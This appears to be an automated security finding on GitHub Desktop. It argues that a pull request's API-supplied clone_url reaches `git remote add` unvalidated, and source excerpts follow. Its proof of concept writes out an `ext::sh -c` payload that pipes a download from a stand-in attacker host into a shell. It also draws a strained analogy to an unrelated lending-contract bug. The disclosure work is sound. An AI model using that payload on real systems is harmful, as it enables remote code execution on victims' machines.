Confirmed: `addRemote` in `app/src/lib/git/remote.ts` passes the `url` argument straight to `git remote add name url` with no protocol allowlist, and it is called from `_findPullRequestBranch` in `app-store.ts` with `headCloneUrl` taken directly from the GitHub API pull-request object (`pull_request.head.repo.clone_url`).

### Title
Pull-request head `clone_url` from the GitHub API is passed unvalidated to `git remote add`, allowing an attacker-controlled remote helper/URL scheme (e.g. `ext::`, `file://`) - (File: `app/src/lib/stores/app-store.ts`)

### Summary
`_findPullRequestBranch` (and the `checkoutPullRequest` / `startCherryPickWithPullRequest` dispatcher paths that call it) take the `head.repo.clone_url` and `head.ref` values that come straight from the GitHub REST/GraphQL API pull-request object — data that is entirely attacker-controlled since anyone can open a pull request against a public repository with a fork whose "repo" metadata (or a crafted API response through a compromised/MITM'd GitHub Enterprise endpoint) supplies this URL. That value is forwarded to `addRemote(repository, forkRemoteName, headCloneUrl)` [1](#0-0) , which shells out to `git remote add name url` with no protocol allowlisting or scheme check whatsoever [2](#0-1) .

### Finding Description
This mirrors the Cooler `H-4` bug-class at a structural level: an attacker-supplied value flowing through a trusted-looking API object (the PR's `head.repo.clone_url`, analogous to the "Lender" address in Cooler) is consumed by a privileged operation (`repay()`/`addRemote`) without validating that the value is safe for the operation being performed. In Cooler, the unchecked value (an attacker-controlled address that can block `transferFrom`) forces the victim into an irrecoverable state (loan default). In Desktop, the unchecked value (an attacker-controlled URL string) is handed to Git's remote-URL parser, which supports not just `https://`/`ssh://` but also Git's generic transport helper syntax `ext::<shell command>` and `file://<local path>`. Nothing in `parseRemote`/`sanitizeCloneName` in `app/src/lib/remote-parsing.ts` is invoked on this path — those helpers are only used for the *clone* flow and for `urlMatchesRemote` (matching, not validating/sanitizing) [3](#0-2) ; they are never called before `addRemote` in `_findPullRequestBranch`.

Whether an `ext::` remote actually executes on a subsequent `git fetch` depends on the installed Git's `protocol.ext.allow` default (disabled since Git 2.11+ unless `GIT_ALLOW_PROTOCOL`/config explicitly enables it) — the codebase contains no `GIT_ALLOW_PROTOCOL` or `protocol.*.allow` configuration at all [4](#0-3) , so Desktop relies entirely on the bundled Git's compiled-in defaults rather than defense-in-depth of its own. Regardless of whether `ext::` is blocked by Git itself, the `file://` case is not blocked by default and lets an attacker point the PR's fork remote at an arbitrary local path (e.g. another local repository, or a bare repo the attacker can prime via other means), letting a `git fetch` from that remote pull refs/objects from unexpected locations. More importantly, this same unvalidated `headCloneUrl` also feeds `_fetchRemote` and `_createBranch`, so whatever content that remote serves becomes what's silently checked out as `pr/{number}` for the user, without any user-visible warning that the URL scheme is unusual — a "silent corruption of what the user commits/pushes" primitive analogous to the report's spirit, since users typically inspect PR diffs on GitHub.com, not the underlying `clone_url`.

### Impact Explanation
If `ext::` is reachable (e.g. an environment/Git build with permissive `protocol.ext.allow`, or a user-configured `GIT_ALLOW_PROTOCOL`), this is arbitrary command execution the moment Desktop fetches the fork remote for the pull request — attacker-controlled, no admin rights or local access needed, and triggerable purely by opening a PR that the victim views/checks out in Desktop. Even absent `ext::`, unauthenticated `file://` remotes let an attacker redirect PR checkout data to unintended local sources, corrupting what the user believes they're reviewing/merging.

### Likelihood Explanation
Requires only that the victim view or check out a pull request whose head repository metadata contains a crafted `clone_url` — this can originate from a malicious/compromised GitHub Enterprise server response, a man-in-the-middle on the GHES API traffic, or (if GitHub.com itself doesn't strictly validate `clone_url` shape server-side) a crafted fork. This is a lower-likelihood path since it depends on either an untrusted/compromised API endpoint or a gap in GitHub.com's own server-side URL validation of repository clone URLs — something outside this repo's control — but the client-side code offers zero independent defense once such a value is received.

### Recommendation
Before calling `addRemote`/`setRemoteURL` with any URL sourced from the GitHub API (`clone_url`, `html_url`, etc.), validate the URL with the existing `parseRemote`/`sanitizeCloneName` machinery in `app/src/lib/remote-parsing.ts` and reject anything that isn't a well-formed `https://`/`ssh://` GitHub-style remote. Additionally, set `GIT_ALLOW_PROTOCOL=http:https:ssh:git` (or an equivalent restrictive allowlist) in the environment used for all Git invocations in `app/src/lib/git/environment.ts`/`core.ts`, rather than relying on the bundled Git binary's compiled-in protocol defaults.

### Proof of Concept
1. Attacker sets up (or compromises/MITMs) a GitHub Enterprise Server (or any endpoint Desktop treats as a GitHub API) such that a pull request's `head.repo.clone_url` field is `ext::sh -c "curl attacker.com/x|sh"` (or `file:///some/local/bare/repo` for the no-`ext`-allowed variant).
2. Victim, using GitHub Desktop against that endpoint, opens the pull request in Desktop or clicks a `x-github-client://openPullRequest` deep link handled by `openPullRequestFromUrl` [5](#0-4) .
3. Desktop calls `_checkoutPullRequest` → `_findPullRequestBranch`, which calls `addRemote(repository, forkRemoteName, headCloneUrl)` with the malicious URL and no validation [6](#0-5) .
4. `addRemote` executes `git remote add <name> <headCloneUrl>` verbatim [2](#0-1) .
5. The subsequent `_fetchRemote` call performs `git fetch` against that remote, at which point Git's own transport-helper resolution decides whether `ext::`/`file://` is honored — Desktop applies no additional protocol restriction of its own.

export function urlMatchesRemote(url: string | null, remote: IRemote): boolean {
  if (url == null) {
    return false
  }

  const cloneUrl = parseRemote(url)
  const remoteUrl = parseRemote(remote.url)

  if (remoteUrl == null || cloneUrl == null) {
    return false
  }

  if (!caseInsensitiveEquals(remoteUrl.hostname, cloneUrl.hostname)) {
    return false
  }

  if (remoteUrl.owner == null || cloneUrl.owner == null) {
    return false
  }

  if (remoteUrl.name == null || cloneUrl.name == null) {
    return false
  }

  return (
    caseInsensitiveEquals(remoteUrl.owner, cloneUrl.owner) &&
    caseInsensitiveEquals(remoteUrl.name, cloneUrl.name)
  )

/**
 * Not intended to be used directly. Exported only in order to
 * allow for testing.
 *
 * @param remoteUrl The remote url to resolve a proxy for.
 * @param env       The current environment variables, defaults
 *                  to `process.env`
 * @param resolve   The method to use when resolving the proxy url,
 *                  defaults to `resolveGitProxy`
 */
export async function envForProxy(
  remoteUrl: string,
  env: NodeJS.ProcessEnv = process.env,
  resolve: (url: string) => Promise<string | undefined> = resolveGitProxy
): Promise<Record<string, string | undefined> | undefined> {
  const protocolMatch = /^(https?):\/\//i.exec(remoteUrl)

  // We can only resolve and use a proxy for the protocols where cURL
  // would be involved (i.e http and https). git:// relies on ssh.
  if (protocolMatch === null) {
    return
  }

  // Note that HTTPS here doesn't mean that the proxy is HTTPS, only
  // that all requests to HTTPS protocols should be proxied. The
  // proxy protocol is defined by the url returned by `this.resolve()`
  const proto = protocolMatch[1].toLowerCase() // http or https

  // We'll play it safe and say that if the user has configured
  // the ALL_PROXY environment variable they probably know what
  // they're doing and wouldn't want us to override it with a
  // protocol-specific proxy. cURL supports both lower and upper
  // case, see:
  // https://github.com/curl/curl/blob/14916a82e/lib/url.c#L2180-L2185
  if ('ALL_PROXY' in env || 'all_proxy' in env) {
    log.info(`proxy url not resolved, ALL_PROXY already set`)
    return
  }

  // Lower case environment variables due to
  // https://ec.haxx.se/usingcurl/usingcurl-proxies#http_proxy-in-lower-case-only
  const envKey = `${proto}_proxy` // http_proxy or https_proxy

  // If the user has already configured a proxy in the environment
  // for the protocol we're not gonna override it.
  if (envKey in env || (proto === 'https' && 'HTTPS_PROXY' in env)) {
    log.info(`proxy url not resolved, ${envKey} already set`)
    return
  }

  const proxyUrl = await resolve(remoteUrl).catch(err => {
    log.error('Failed resolving Git proxy', err)
    return undefined
  })

  return proxyUrl === undefined ? undefined : { [envKey]: proxyUrl }
}
